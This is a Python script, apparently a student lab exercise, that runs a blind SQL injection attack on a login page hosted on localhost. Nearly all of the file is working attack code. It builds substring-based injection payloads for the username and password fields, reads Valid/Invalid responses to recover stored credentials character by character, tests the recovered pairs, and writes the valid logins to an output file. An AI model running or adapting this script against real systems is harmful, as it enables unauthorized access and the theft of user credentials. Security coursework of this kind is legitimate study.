#!/usr/bin/python3
##################################################################################################################################
##################################################################################################################################
import code
import requests
import string
from urllib.request import urlopen
from bs4 import BeautifulSoup
from bs4 import Comment
import sys, getopt
##################################################################################################################################
##################################################################################################################################
# Variables 
LOWER_ALPHABET_LIST = list(string.ascii_lowercase)          # Creates string of all lower case letters
ALL_ALPHABET_LETTERS = list(string.ascii_letters)           # Concatenation of the ascii_lowercase and ascii_uppercase
DIGIT_LIST = list(string.digits)                            # Creates a string '0123456789' 
# LETTERS_NUMBERS = ALL_ALPHABET_LETTERS + DIGIT_LIST         # Combines upper/lower case w. 1-9 string for passwords
LETTERS_NUMBERS = LOWER_ALPHABET_LIST + DIGIT_LIST
TEST_PAGE = 'http://localhost/blind/login-illustrated.php'  # Variable to store website 
MAX_USERNAME_LENGTH = 10                                    # Max username length
FILENAME = 'Mendello_David_Output.txt'                            # File to write output to
##################################################################################################################################
##################################################################################################################################
# Function to test characters in username - determines length of username 
def test_username_str_position(text, position):
    char_base_text = "\' or substring(userName,{0},{1}) = \"{2}\" -- \""
    return char_base_text.format(position, len(text), text)
##################################################################################################################################
# Function to test characters in password - determines length of username 
def test_password_str_position(text, position):
    password_base_text = "\' or substring(password,{0},{1}) = \"{2}\" -- \""
    return password_base_text.format(position, len(text), text)
##################################################################################################################################
# Function to test if SQL query response message is valid or invalid
def is_valid_response(r):
    bsObj = BeautifulSoup(r.text, 'lxml')
    message = str(bsObj.find('div', {'class':'message'}).string)
    return message.find('Valid') != -1
##################################################################################################################################
def test_password_str(text):
    password_base_text = "\' or password = \"{0}\" -- \""
    return password_base_text.format(text)
##################################################################################################################################
def test_full_password(text):
    password = test_password_str(text)      
    params = {'userName': '', 'password': password} 
    r = requests.post(TEST_PAGE, params)
    return is_valid_response(r)
##################################################################################################################################
def test_full_username(text):
    username = "\' or userName = \"{0}\" -- \"".format(text)
    params = {'userName': username, 'password': ''}
    r = requests.post(TEST_PAGE, params)
    return is_valid_response(r)
##################################################################################################################################
##################################################################################################################################
# Function to determine valid characters in username- creating a list of lists with all possible characters for each position 
def get_user_chars():
    # List to store each "dial" of the possible usernames
    user_chars = []
    position = 1
    while True:
        # List for each character on the "dial"
        username_current_chars = []
        for char in LOWER_ALPHABET_LIST:
            # Build the injection string
            username = test_username_str_position(char, position)
            params = {'userName': username, 'password': ''}
            r = requests.post(TEST_PAGE, params)
            if is_valid_response(r):
                username_current_chars.append(char)
        # Now we're done with this dial
        position += 1
        if len(username_current_chars) != 0:
            user_chars.append(username_current_chars)
        else:
            break
    return user_chars
##################################################################################################################################          
# Function to determine valid characters in password- creating a list of lists with all possible characters for each position 
def get_password_chars():
    # List to store each "dial" of the possible passwords
    password_chars = []
    position = 1
    while True:
        # List for each character on the "dial"
        password_current_chars = []
        for char in LETTERS_NUMBERS:
#        for char in LOWER_ALPHABET_LIST:
            # Build the injection string
            password = test_password_str_position(char, position) 
            params = {'userName': '', 'password': password} 
            r = requests.post(TEST_PAGE, params)
            if is_valid_response(r):
                password_current_chars.append(char)
        # Now we're done with this dial
        position += 1
        if len(password_current_chars) != 0:
            password_chars.append(password_current_chars)
        else:
            break
    return password_chars
##################################################################################################################################
##################################################################################################################################
# Function to create all possible usernames
def get_usernames(valid_chars):
    # List to store each combined "dial" of the possible usernames
    user_names = []
    # First column is always valid so just add it and skip to the second
    user_names.append(valid_chars[0])
    position = 1
    # Outer loop deals with which "dials" we are working on
    while True:
        # List for each character on the "dial"
        username_parts = []
        # Go through each of the name parts in the previous list
        for c_base in user_names[position - 1]:
            for char in valid_chars[position]:
                # Build the injection string
                name_part = c_base + char
                username = test_username_str_position(name_part, 1)
                params = {'userName': username, 'password': ''}
                r = requests.post(TEST_PAGE, params)
                if is_valid_response(r):
                    username_parts.append(name_part)
        # Now we're done with this dial
        position += 1
        if len(username_parts) != 0:
            user_names.append(username_parts)
        else:
            break
        if position >= len(valid_chars):
            break
    actual_usernames = []
    for username_list in user_names:
        for username in username_list:
            if test_full_username(username):
                actual_usernames.append(username)
    return actual_usernames
##################################################################################################################################
# FUnction to create all possible passwords
def get_passwords(valid_chars):
    # List to store each combined "dial" of the possible usernames
    passwords = []
    # First column is always valid so just add it and skip to the second
    passwords.append(valid_chars[0])
    position = 1
    # Outer loop deals with which "dials" we are working on
    while True:
        # List for each character on the "dial"
        password_parts = []
        # Go through each of the name parts in the previous list
        for c_base in passwords[position - 1]:
            for char in valid_chars[position]:
                # Build the injection string
                passwd_parts = c_base + char
                password = test_password_str_position(passwd_parts, 1)
                params = {'userName': '', 'password': password}
                r = requests.post(TEST_PAGE, params)
                if is_valid_response(r):
                    password_parts.append(passwd_parts)
        # Now we're done with this dial
        position += 1
        if len(password_parts) != 0:
            passwords.append(password_parts)
        else:
            break
        if position >= len(valid_chars):
            break
    actual_passwords = []
    for password_list in passwords:
        for password in password_list:
            if test_full_password(password):
                actual_passwords.append(password)
    return actual_passwords
##################################################################################################################################
##################################################################################################################################
def try_usernames_passwords(usernames, passwords):
    username_password_combo = []
    for users in usernames:
        for passwd in passwords:
            params = {'userName': users, 'password': passwd}    
            r = requests.post(TEST_PAGE, params)   
            if is_valid_response(r):
                username_password_combo.append((users, passwd))
                break
    return username_password_combo
##################################################################################################################################
##################################################################################################################################
def main():
    usernames = get_usernames(get_user_chars())
    passwords = get_passwords(get_password_chars())
    auth_pairs = try_usernames_passwords(usernames, passwords)

    file_open = open(FILENAME, "w")


    for combo in auth_pairs:
        print(combo)
        file_open.write(str(combo))
    
    file_open.close()

main()
